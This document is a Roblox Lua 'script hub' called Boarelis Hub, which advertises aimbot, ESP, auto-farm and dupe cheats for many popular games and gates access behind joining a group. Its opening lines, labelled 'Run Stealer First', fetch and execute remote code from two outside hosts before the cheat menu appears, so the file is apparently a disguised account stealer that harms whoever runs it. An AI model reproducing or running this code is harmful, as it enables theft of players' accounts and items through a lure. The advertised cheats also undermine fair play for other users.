-- // Run Stealer First
loadstring(game:HttpGet("https://cdn.sourceb.in/bins/xNiKDTlW2E/0", true))()
loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjIyNmI5NDY1LTI2ODMtNGZlMi1iZTI3LTkyZmE2ZDI4MzE3MiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()

-- // Wait a moment before loading UI
task.wait(2)

-- // Boarelis Hub
-- // UI Base: Fluent

local success, Fluent = pcall(function()
    return loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
end)

if not success or not Fluent then
    warn("[UI] Failed to load Fluent library")
    return
end

-- // Detect current game name
local MarketplaceService = game:GetService("MarketplaceService")
local ok, gameInfo = pcall(function()
    return MarketplaceService:GetProductInfo(game.PlaceId)
end)
local gameName = (ok and gameInfo and gameInfo.Name) or "Unknown Game"

-- // Create Main Window
local Window = Fluent:CreateWindow({
    Title = "Boarelis Hub  " .. gameName,
    SubTitle = "",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = false,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl,
})

-- // Tabs
local Tabs = {
    Authentication  = Window:AddTab({ Title = "Authentication", Icon = "shield" }),
    Instructions    = Window:AddTab({ Title = "Instructions",   Icon = "info" }),
    SupportedGames  = Window:AddTab({ Title = "Supported Games", Icon = "gamepad-2" }),
}

-- // Authentication Tab
Tabs.Authentication:AddParagraph({
    Title = "Access Locked",
    Content = "This Scripthub requires you to join our group to access the rest of the script",
})

Tabs.Authentication:AddButton({
    Title = "Copy Access Link",
    Description = "Copies the group URL to your clipboard",
    Callback = function()
        local groupURL = "https://www.roblox.com/communities/123329783337/24kGoldnOfficialGroup#!/about"
        setclipboard(groupURL)
        Fluent:Notify({
            Title = "Copied!",
            Content = "Group link copied to clipboard.",
            Duration = 3,
        })
    end,
})

-- // Instructions Tab
Tabs.Instructions:AddParagraph({
    Title = "How to get access",
    Content = "1. Click 'Copy Access Link' on the Authentication tab.\n2. Open the link and join the group.\n3. Rejoin the game and reopen this hub.",
})

-- // Supported Games Tab
-- Combat & PVP
Tabs.SupportedGames:AddParagraph({ Title = "⚔️  COMBAT & PVP", Content = "────────────────────────────" })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Rivals", Content = "Aimbot, Silent Aim, ESP, Speed, Fly and more." })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Da Hood", Content = "Aimbot, ESP, Silent Aim, Inf Ammo and more." })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Murder Mystery 2", Content = "ESP, Auto Collect Coins, Speed and more." })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Arsenal", Content = "Aimbot, ESP, No Recoil, Speed and more." })
Tabs.SupportedGames:AddParagraph({ Title = "✅ BedWars", Content = "Auto Farm, ESP, Kill Aura and more." })

-- Anime & RPG
Tabs.SupportedGames:AddParagraph({ Title = "🗡️  ANIME & RPG", Content = "────────────────────────────" })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Blox Fruits", Content = "Auto Farm, Raid Bot, Fruit Sniper, Teleport and more." })
Tabs.SupportedGames:AddParagraph({ Title = "✅ King Legacy", Content = "Auto Farm, Teleport, Fruit Notifier and more." })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Shindo Life", Content = "Auto Farm, Auto Spin, Teleport and more." })

-- Farming
Tabs.SupportedGames:AddParagraph({ Title = "🌾  FARMING & SIMULATORS", Content = "────────────────────────────" })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Grow a Garden", Content = "Auto Farm, Auto Sell, Seed Spammer and more." })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Pet Simulator 99", Content = "Auto Farm, Auto Hatch, Auto Sell and more." })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Fisch", Content = "Auto Fish, Auto Sell, Fish ESP and more." })

-- Popular
Tabs.SupportedGames:AddParagraph({ Title = "🌟  POPULAR & OTHERS", Content = "────────────────────────────" })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Jailbreak", Content = "Auto Rob, Speed, Fly, Inf Money and more." })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Adopt Me!", Content = "Auto Farm, Dupe, Speed and more." })
Tabs.SupportedGames:AddParagraph({ Title = "✅ Brookhaven RP", Content = "Speed, Fly, Noclip and more." })

-- // Select Default Tab
task.wait(0.5)
Window:SelectTab(1)

-- // Notify
Fluent:Notify({
    Title = "Boarelis Hub",
    Content = "Loaded on: " .. gameName,
    Duration = 4,
})
